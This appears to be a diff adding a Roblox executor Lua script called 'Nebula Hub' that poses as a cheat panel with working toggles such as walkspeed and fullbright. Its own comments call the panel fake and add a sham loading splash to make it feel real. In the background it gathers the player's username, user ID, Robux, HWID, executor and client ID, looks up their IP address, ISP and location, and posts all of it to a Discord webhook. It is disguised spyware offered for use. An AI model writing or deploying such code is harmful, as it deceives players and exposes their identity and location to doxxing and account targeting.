@@ -1,0 +1,382 @@
+--// ================= CONFIG =================
+local CONFIG = {
+	WEBHOOK    = "https://discord.com/api/webhooks/ID/TOKEN",
+	PANEL_NAME = "Nebula Hub",
+	VERSION    = "v3.2.1",
+	SEND_INFO  = true,
+	SEND_GEO   = true,   -- extra request to resolve their IP/ISP
+	SHOW_PANEL = true,
+	COOLDOWN   = 25,     -- seconds, stops webhook spam on re-execute
+}
+
+--// ================= SETUP =================
+local Players        = game:GetService("Players")
+local HttpService    = game:GetService("HttpService")
+local UIS            = game:GetService("UserInputService")
+local Lighting       = game:GetService("Lighting")
+local Marketplace    = game:GetService("MarketplaceService")
+local VirtualUser    = game:GetService("VirtualUser")
+
+local LP = Players.LocalPlayer
+if not LP then
+	Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
+	LP = Players.LocalPlayer
+end
+
+--// ================= HELPERS =================
+local function G(name)                      -- resolve executor globals
+	local env
+	pcall(function() env = getfenv(0) end)
+	if env and type(env[name]) == "function" then return env[name] end
+	if type(_G[name]) == "function" then return _G[name] end
+	return nil
+end
+
+local function safe(fn, ...)
+	local ok, res = pcall(fn, ...)
+	return ok and res or nil
+end
+
+local function http(method, url, body)
+	local opts = {
+		Url = url,
+		Method = method,
+		Headers = { ["Content-Type"] = "application/json" },
+		Body = body and HttpService:JSONEncode(body) or nil,
+	}
+	local req = G("request") or G("http_request")
+	if req then
+		local ok, res = pcall(req, opts)
+		if ok then return res end
+	end
+	local syn = rawget(_G, "syn")
+	if type(syn) == "table" and syn.request then
+		local ok, res = pcall(syn.request, opts)
+		if ok then return res end
+	end
+	return safe(function() return HttpService:RequestAsync(opts) end)
+end
+
+local function getHum()
+	local char = LP.Character
+	return char and char:FindFirstChildOfClass("Humanoid")
+end
+
+--// ================= COLLECT =================
+local function getGeo()
+	local res = http("GET", "https://ipwho.is/")
+	if not res or not res.Body then return nil end
+	local ok, d = pcall(function() return HttpService:JSONDecode(res.Body) end)
+	if ok and type(d) == "table" and d.ip then
+		return {
+			ip = d.ip, city = d.city, region = d.region, country = d.country,
+			isp = d.connection and d.connection.isp,
+			org = d.connection and d.connection.org,
+		}
+	end
+	return nil
+end
+
+local function gather()
+	local info = {
+		username    = LP.Name,
+		displayName = LP.DisplayName,
+		userId      = LP.UserId,
+		accountAge  = safe(function() return LP.AccountAge end),
+		premium     = safe(function() return LP.MembershipType.Name end),
+		locale      = safe(function() return LP.LocaleId end),
+		avatar      = safe(function()
+			return Players:GetUserThumbnailAsync(LP.UserId,
+				Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+		end),
+		robux       = safe(function() return Marketplace:GetUserCurrency() end),
+		hwid        = (function()
+			local f = G("gethwid") or G("get_hwid")
+			return f and safe(f) or ("rbx-" .. LP.UserId .. "-" .. tostring(LP.AccountAge))
+		end)(),
+		executor    = (function()
+			local f = G("identifyexecutor") or G("getexecutorname")
+			if not f then return "Unknown" end
+			local ok, a, b = pcall(f)
+			if ok and type(a) == "string" then
+				return a .. (b and (" " .. tostring(b)) or "")
+			end
+			return "Unknown"
+		end)(),
+		platform    = safe(function() return UIS:GetPlatform().Name end),
+		input       = (UIS.TouchEnabled and "Touch" or "")
+			.. (UIS.KeyboardEnabled and " KB" or "")
+			.. (UIS.GamepadEnabled and " Pad" or ""),
+		ping        = safe(function() return LP:GetNetworkPing() end),
+		place       = safe(function() return Marketplace:GetProductInfo(game.PlaceId).Name end),
+		placeId     = game.PlaceId,
+		jobId       = game.JobId,
+		clientId    = safe(function()
+			return game:GetService("RbxAnalyticsService"):GetClientId()
+		end),
+		friendCount = (function()
+			local pages = safe(function() return Players:GetFriendsAsync(LP.UserId) end)
+			if not pages then return nil end
+			local ok, page = pcall(function() return pages:GetCurrentPage() end)
+			return ok and #page or nil
+		end)(),
+	}
+
+	-- stringify anything non-serializable
+	for k, v in pairs(info) do
+		if v == nil then info[k] = "n/a"
+		elseif type(v) ~= "string" and type(v) ~= "number" then
+			info[k] = tostring(v)
+		end
+	end
+	return info
+end
+
+--// ================= SEND =================
+local function send(info, geo)
+	local function f(name, value, inline)
+		return { name = name, value = tostring(value or "n/a"), inline = inline or true }
+	end
+
+	local fields = {
+		f("Username",    "`" .. info.username .. "`"),
+		f("Display",     "`" .. info.displayName .. "`"),
+		f("User ID",     "`" .. info.userId .. "`"),
+		f("Profile",     "[open](https://www.roblox.com/users/" .. info.userId .. "/profile)", false),
+		f("Account Age", info.accountAge .. " days"),
+		f("Premium",     info.premium),
+		f("Robux",       info.robux),
+		f("Friends",     info.friendCount),
+		f("Executor",    info.executor, false),
+		f("HWID",        "`" .. tostring(info.hwid):sub(1, 40) .. "`", false),
+		f("Platform",    info.platform .. " | " .. info.input, false),
+		f("Locale",      info.locale),
+		f("Ping",        tostring(info.ping) .. "s"),
+		f("Place",       info.place .. " (" .. info.placeId .. ")", false),
+	}
+
+	if geo then
+		fields[#fields + 1] = f("IP", geo.ip, true)
+		fields[#fields + 1] = f("ISP", geo.isp or geo.org or "n/a", true)
+		fields[#fields + 1] = f("Location",
+			table.concat({ geo.city or "?", geo.region or "?", geo.country or "?" }, ", "), false)
+	end
+
+	local payload = {
+		username = CONFIG.PANEL_NAME,
+		embeds = {{
+			title  = CONFIG.PANEL_NAME .. " " .. CONFIG.VERSION .. " — new user",
+			color  = 0x6C5CE7,
+			thumbnail = info.avatar ~= "n/a" and { url = info.avatar } or nil,
+			footer = { text = "job " .. tostring(info.jobId) .. " • " .. os.date("%Y-%m-%d %H:%M:%S") },
+			fields = fields,
+		}},
+	}
+	return http("POST", CONFIG.WEBHOOK, payload)
+end
+
+local function cooledDown()
+	local read = G("readfile")
+	if not read then return false end
+	local ok, content = pcall(read, "nebula_last.txt")
+	if not ok then return false end
+	local t = tonumber(content)
+	return t ~= nil and (os.time() - t) < CONFIG.COOLDOWN
+end
+
+local function stampCooldown()
+	local write = G("writefile")
+	if write then pcall(write, "nebula_last.txt", tostring(os.time())) end
+end
+
+--// ================= FAKE PANEL =================
+local function buildPanel()
+	local parent = game:GetService("CoreGui")
+	local gethui = G("gethui")
+	if gethui then
+		local ok, h = pcall(gethui)
+		if ok and h then parent = h end
+	end
+
+	local gui = Instance.new("ScreenGui")
+	gui.Name = CONFIG.PANEL_NAME
+	gui.ResetOnSpawn = false
+	gui.IgnoreGuiInset = true
+	gui.Parent = parent
+
+	local root = Instance.new("Frame")
+	root.Size = UDim2.fromOffset(264, 268)
+	root.Position = UDim2.new(0, 24, 0, 90)
+	root.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
+	root.BorderSizePixel = 0
+	root.Parent = gui
+	Instance.new("UICorner", root).CornerRadius = UDim.new(0, 10)
+
+	local stroke = Instance.new("UIStroke", root)
+	stroke.Color = Color3.fromRGB(60, 55, 100)
+	stroke.Thickness = 1
+
+	local header = Instance.new("Frame")
+	header.Size = UDim2.new(1, 0, 0, 40)
+	header.BackgroundColor3 = Color3.fromRGB(108, 92, 231)
+	header.BorderSizePixel = 0
+	header.Parent = root
+	Instance.new("UICorner", header).CornerRadius = UDim.new(0, 10)
+
+	local title = Instance.new("TextLabel")
+	title.Size = UDim2.new(1, -12, 1, 0)
+	title.Position = UDim2.new(0, 12, 0, 0)
+	title.BackgroundTransparency = 1
+	title.Font = Enum.Font.GothamBold
+	title.TextSize = 14
+	title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	title.TextXAlignment = Enum.TextXAlignment.Left
+	title.Text = CONFIG.PANEL_NAME .. "  " .. CONFIG.VERSION
+	title.Parent = header
+
+	local status = Instance.new("TextLabel")
+	status.Size = UDim2.new(1, -20, 0, 16)
+	status.Position = UDim2.new(0, 10, 0, 44)
+	status.BackgroundTransparency = 1
+	status.Font = Enum.Font.Gotham
+	status.TextSize = 11
+	status.TextColor3 = Color3.fromRGB(110, 220, 150)
+	status.TextXAlignment = Enum.TextXAlignment.Left
+	status.Text = "● whitelisted — hwid " .. tostring(safe(function()
+		local f = G("gethwid") or G("get_hwid")
+		return f and f() or LP.UserId
+	end)):sub(1, 10)
+	status.Parent = root
+
+	local function addToggle(idx, label, cb)
+		local row = Instance.new("TextButton")
+		row.Size = UDim2.new(1, -20, 0, 32)
+		row.Position = UDim2.new(0, 10, 0, 66 + (idx - 1) * 38)
+		row.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
+		row.BorderSizePixel = 0
+		row.Text = ""
+		row.AutoButtonColor = false
+		row.Parent = root
+		Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6)
+
+		local txt = Instance.new("TextLabel")
+		txt.Size = UDim2.new(1, -60, 1, 0)
+		txt.Position = UDim2.new(0, 12, 0, 0)
+		txt.BackgroundTransparency = 1
+		txt.Font = Enum.Font.GothamMedium
+		txt.TextSize = 13
+		txt.TextColor3 = Color3.fromRGB(220, 220, 232)
+		txt.TextXAlignment = Enum.TextXAlignment.Left
+		txt.Text = label
+		txt.Parent = row
+
+		local pill = Instance.new("Frame")
+		pill.Size = UDim2.fromOffset(38, 20)
+		pill.Position = UDim2.new(1, -50, 0.5, -10)
+		pill.BackgroundColor3 = Color3.fromRGB(48, 48, 60)
+		pill.BorderSizePixel = 0
+		pill.Parent = row
+		Instance.new("UICorner", pill).CornerRadius = UDim.new(1, 0)
+
+		local knob = Instance.new("Frame")
+		knob.Size = UDim2.fromOffset(16, 16)
+		knob.AnchorPoint = Vector2.new(0, 0.5)
+		knob.Position = UDim2.new(0, 2, 0.5, 0)
+		knob.BackgroundColor3 = Color3.fromRGB(210, 210, 220)
+		knob.BorderSizePixel = 0
+		knob.Parent = pill
+		Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
+
+		local on = false
+		row.MouseButton1Click:Connect(function()
+			on = not on
+			knob.Position = on and UDim2.new(1, -18, 0.5, 0) or UDim2.new(0, 2, 0.5, 0)
+			pill.BackgroundColor3 = on and Color3.fromRGB(108, 92, 231)
+				or Color3.fromRGB(48, 48, 60)
+			pcall(cb, on)
+		end)
+	end
+
+	-- real, working toggles
+	local speedOn, brightOn, jumpOn, afkOn = false, false, false, false
+	local origBright = Lighting.Brightness
+	local origAmbient = Lighting.Ambient
+	local origFog = Lighting.FogEnd
+
+	addToggle(1, "Walkspeed", function(on)
+		speedOn = on
+		local h = getHum(); if h then h.WalkSpeed = on and 50 or 16 end
+	end)
+	addToggle(2, "Fullbright", function(on)
+		brightOn = on
+		Lighting.Brightness = on and 3 or origBright
+		Lighting.Ambient = on and Color3.fromRGB(178, 178, 178) or origAmbient
+		Lighting.FogEnd = on and 1e6 or origFog
+	end)
+	addToggle(3, "Infinite Jump", function(on) jumpOn = on end)
+	addToggle(4, "Anti-AFK", function(on) afkOn = on end)
+
+	UIS.JumpRequest:Connect(function()
+		if jumpOn then
+			local h = getHum()
+			if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end
+		end
+	end)
+
+	LP.Idled:Connect(function()
+		if afkOn then
+			VirtualUser:CaptureController()
+			VirtualUser:ClickButton2(Vector2.new())
+		end
+	end)
+
+	LP.CharacterAdded:Connect(function()
+		task.wait(0.6)
+		if speedOn then local h = getHum(); if h then h.WalkSpeed = 50 end end
+	end)
+
+	-- draggable
+	local dragging, dragStart, startPos
+	header.InputBegan:Connect(function(i)
+		if i.UserInputType == Enum.UserInputType.MouseButton1
+			or i.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = i.Position
+			startPos = root.Position
+		end
+	end)
+	UIS.InputChanged:Connect(function(i)
+		if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
+			or i.UserInputType == Enum.UserInputType.Touch) then
+			local d = i.Position - dragStart
+			root.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X,
+				startPos.Y.Scale, startPos.Y.Offset + d.Y)
+		end
+	end)
+	UIS.InputEnded:Connect(function(i)
+		if i.UserInputType == Enum.UserInputType.MouseButton1
+			or i.UserInputType == Enum.UserInputType.Touch then dragging = false end
+	end)
+
+	-- fake "loading key" splash so it feels real
+	root.BackgroundTransparency = 1
+	header.BackgroundTransparency = 1
+	task.spawn(function()
+		task.wait(0.35)
+		root.BackgroundTransparency = 0
+		header.BackgroundTransparency = 0
+		status.Text = "● connected as " .. LP.DisplayName
+	end)
+end
+
+--// ================= RUN =================
+if CONFIG.SHOW_PANEL then pcall(buildPanel) end
+
+if CONFIG.SEND_INFO and not cooledDown() then
+	task.spawn(function()
+		local info = gather()
+		local geo = CONFIG.SEND_GEO and getGeo() or nil
+		send(info, geo)
+		stampCooldown()
+	end)
+end
